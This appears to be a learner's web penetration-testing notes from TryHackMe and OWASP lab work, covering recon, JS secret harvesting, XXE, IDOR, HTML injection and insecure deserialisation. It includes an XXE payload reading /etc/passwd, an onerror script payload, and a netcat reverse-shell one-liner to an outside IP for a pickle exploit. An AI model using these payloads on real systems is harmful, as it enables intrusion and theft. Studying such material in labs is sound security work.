solve for lab: https://tryhackme.com/
install vpn: https://tryhackme.com/r/access

Also solve for owasp bwa for all the lab ( A VM for all the labs)
metaexploitable 2 , vulnearable machine
Metaexploit: set of tools and payload
WAF: Web application firewall.

### Concept
- Every penetration testing should be customised for each target category like ecommerce, banking etc
- functionality mapping
  - Ecommerce
    - Major
      * Security of Payment Gateway
      * Security of customer journey like validating form, location base vulnerability
      * Security of personal data
      * Security of integrity of catalogue
      * Security of service continuity (DoS)
      * Security of Traffic diversion

    - Minor ( based on target)
      * Search bar
      * Login
      * Oauth
      * Reset password
      * pincode ( location required)
      * request a product/replace instead of product not available/ refund if product not available
      * Add to cart
      * Favourites
      * Hosted images
      * special instruction ()
      * edit profile
      * EBT snap card
  

# Solving OWASP top 10
https://tryhackme.com/r/room/owasptop10

## RECON and info_gather.docx
## SUBDOMAIN
### SQLMAP scan for parametrised URL
### Path traversal argument 
- Find path associated variable and then install `physcopath` extension of bapp store
- Do attack on intruder for path using the extension




### SSRF and ssrf_docx
- Any url is suspected to have SSRF
- `@` in url means `username:password@hostname`
- Internal subdomain

### Finding hidden query param
using ffuf with /seclist/discovery/web-content/raft-long-text
https://github.com/s0md3v/Arjun/wiki/Usage#import-multiple-targets
`arjun -u https://api.example.com/endpoint -m POST -c 10`
`arjun -i targets.txt` # multiple targets
and try
- burp param miner extension
  Extender->Extensions->Param Miner->Output
### Xss.md
### XSS cookie csrf docx
### File Intrusion docx
### RCE / cmd_injection.docx
using 
- bash
- netcat
- php shell



## Nuclei
## Authentication docx
## Race condition
## 
## websocket.docx
## LLM attacks

## API testing docx


### IP segregation
- `A` record collection if all IPs from the massdns result
`cat live_subdomain_massdns.txt| grep  " A "| awk -F ' ' '{ print $3}' | anew allips`
- non `A` records
`cat live_subdomain_massdns.txt| grep -v " A "`
`cat live_subdomain_massdns.txt| grep -v " A "  | wc`
`cat live_subdomain_massdns.txt| grep " CNAME "  | anew allcnames`


### Secret Information Leak
Finding all js file which contains secrets

`subjs`
`katana` This one gives a lot of result

`subjs -c 100 -i live_subdomain_httpx_toolkit_subonly   > alljs_subjs`

`katana -list live_subdomain_httpx_toolkit_subonly -jc  | grep ".js$" | anew  alljs_katana`


#### Secret finder

```

git clone https://github.com/m4ll0k/SecretFinder.git secretfinder
cd secretfinder
python -m pip install -r requirements.txt or pip install -r requirements.txt
or use apt install python3-xyz
cat alljs_katana | while read url; do python secretfinder/SecretFinder.py -i $url -o cli >> secret.hml; done

```
Finding secrets using other tools like mantra on js file urls
Mantra github
`cat jsfile | mantra -s`

### Authentication
- Cookie is used to maintain the authentication state of the stateless server.
- session cookie containing predictable value so that it can be created for other user
- try space before the username to check if re-registration bug is present
- 

### XXE (XML External Entity)
#### Definition
XML: platorm independent, programming independent
Validation using DTD(Document Type Definition) and schema
e.g.

`<? xml version="1.0" encoding="utf-8" ?>
<mail>
</mail>
`

filename: note.dtd 
```
<!DOCTYPE note [ <!ELEMENT note (to, from, heading, body)> <! ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)>] <!ENTITY greeting "hello world"> >
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

So now let's understand how that DTD validates the XML. Here's what all those terms used in note.dtd mean

!DOCTYPE note -  Defines a root element of the document named note
!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
!ELEMENT to - Defines the to element to be of type "#PCDATA"
!ENTITY greeting-  create the new entity

NOTE: #PCDATA means parseable character data.


____________

The below payload gives the content of the file back to user from password file
```
<? xml version="1.0" ?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read; </root>

<? xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY name 'feast'>]>
<root>&name; </root>
```
 
#### Attack
XML parsing abuse is the main reason for the attack
- DOS attack
- SSRF
- Enable port scanning 
- Remote code execution  (RC)

Type of XXE attack:
- In Band: Immediate response
- Out Band: No immediate response hence the attacker has to write the output to some file / or other server
  

#### Broken Access Control

##### IDOR  (Insecure Direct Object Reference)
Are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.
- Look for Parametrised URL and then check if they are only present for access of Object, if this happens then IDOR is present
- IDOR vulnerability with direct reference to static files which contains sensitive information like chat being store into file system with file name incremented or something
- The Value of a Parameter Is Used Directly to Retrieve a Database Record
- The Value of a Parameter Is Used Directly to Perform an Operation in the System
- The Value of a Parameter Is Used Directly to Retrieve a File System Resource
- The Value of a Parameter Is Used Directly to Access Application Functionality
- parameter pollution: adding redundant param with different value to check if it passess, e.g. GET /api?userID=12&userId22 and if this returns userID 22 data then IDOR
- JSON globbing: if the request accepts json then use different datatype in the json to trigger
  - aarray of IDs
  - bool
  - *, %,
  - large number with zeros or so
  - negative
  - decimal
  - string with delimiters: `'12,34'`
- Change the request method type to POST, GET, OPTION, PUT
- Use of depricated version like if the the URL has V2 then V1 might also exist
- Exploiting IDORs in APIs that use static keywords. e.g if `/api/me/profile` is being used then it might be possible to use the same api with different userid `/api/123/profile`
- sometime the parameter contains UUID, then finding other's UUID is difficult so use public profile pictures, app sharing links, in app message,re-register the email, error with UUID, or /all, /list or some wayback machine, and seach engine to find it. https://x.com/intigriti/status/1489941887641399300 
- Second order IDORs: `form {userID: '1234/../1245'}` or `/api/1234/../1245`


#### Firewall
If the ping is not working, then there could be firewall problem.


### HTML injection attack:
Adding arbitrary html code into the page via passing html code to input/parameter. The target variable responsible is due to innerHTML or document.write
```
var userposition=location.href.indexOf("user=");
var user=location.href.substring(userposition+5);
document.getElementById("Welcome").innerHTML=" Hello, "+user;
```
```
var userposition=location.href.indexOf("user=");
var user=location.href.substring(userposition+5);
document.write("<h1>Hello, " + user +"</h1>");
```
Both code can be passed the payload like `http://vulnerable.site/page.html?user=<img%20src='aaa'%20onerror=alert(1)>` and will execute any arbitrary code



### Apache Struts
if it website link contains .strut, .trq or .do then check for vulnerability and check the exploit using google.com
    	- exploit-db gives use the  exploit payload
    	- 


### Jenkin CVs


### Security Misconfiguration
https://tryhackme.com/r/room/owasptop10
oshp-validator github to validate all headers ( for future )
- Default Passwords on gitub or in source code
- 


### Serialisation / deserialisation
- insecure deserialisation 
  - Cookie
    - secure only : if set, this cookie will set over https
    - change different flag of cookie to check for IDOR or access admin page
  - python pickle exploit
    `nc -nlvp 4444`
    checking the deserialisation happening from base64 using pickle.loads(base64),
    so encoding our command into base64
    reverse shell payload `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.17.27.35  4444 > /tmp/f`
    * find any file any level deep
    `find <root dir> -type f -name '<regex for file>'`
    * all decoding https://dencode.com

### Known vulnerability
- `wpscan` for wordpress scan to get the version and check vulnerability if present on exploit-db and use the exploit as is to check the vulnerability
- check different variable of the keyword found and do the exploit-db search properly



### Information Gathering
143.110.250.149
checking the IP of malicious activity
  - open-source databases out there, like AbuseIPDB, and Cisco Talos Intelligence, where you can perform a reputation and location check for the IP address







  

